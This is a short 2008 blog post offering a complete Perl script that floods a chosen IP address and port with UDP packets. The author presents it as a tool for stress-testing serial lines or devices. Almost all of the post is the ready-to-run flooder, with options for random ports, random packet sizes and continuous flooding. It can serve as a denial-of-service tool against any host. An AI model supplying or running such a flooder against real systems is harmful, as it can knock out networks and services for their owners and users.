---
title: "UDP flood in Perl"
date: "2008-03-22T07:57:00.002+01:00"
tags: [ labs ]
---

<iframe border="0" frameborder="0" height="150" marginheight="0" marginwidth="0" scrolling="no" src="http://rcm-na.amazon-adsystem.com/e/cm?t=cisioshinandt-20&amp;o=1&amp;p=6&amp;l=st1&amp;mode=books&amp;search=Perl&amp;fc1=000000&lt;1=_blank&amp;lc1=3366FF&amp;bg1=FFFFFF&amp;f=ifr" style="border:none; float:right;" width="120"></iframe>If you'll ever find yourself in a situation where you'll need UDP flooding (serial line or device stress testing) but won't have a dedicated flood program available (they're usually just a few click away if you consult uncle Google), here's a Perl version of UDP flood:<pre class="code">#!/usr/bin/perl<br/>##############<br/><br/># udp flood.<br/>##############<br/> <br/>use Socket;<br/>use strict;<br/> <br/>if ($#ARGV != 3) {<br/>  print "flood.pl &lt;ip&gt; &lt;port&gt; &lt;size&gt; &lt;time&gt;\n\n";<br/>  print " port=0: use random ports\n";<br/>  print " size=0: use random size between 64 and 1024\n";<br/>  print " time=0: continuous flood\n";<br/>  exit(1);<br/>}<br/> <br/>my ($ip,$port,$size,$time) = @ARGV;<br/> <br/>my ($iaddr,$endtime,$psize,$pport);<br/> <br/>$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";<br/>$endtime = time() + ($time ? $time : 1000000);<br/> <br/>socket(flood, PF_INET, SOCK_DGRAM, 17);<br/><br/> <br/>print "Flooding $ip " . ($port ? $port : "random") . " port with " . <br/>  ($size ? "$size-byte" : "random size") . " packets" . <br/>  ($time ? " for $time seconds" : "") . "\n";<br/>print "Break with Ctrl-C\n" unless $time;<br/> <br/>for (;time() &lt;= $endtime;) {<br/>  $psize = $size ? $size : int(rand(1024-64)+64) ;<br/>  $pport = $port ? $port : int(rand(65500))+1;<br/> <br/>  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}</pre>

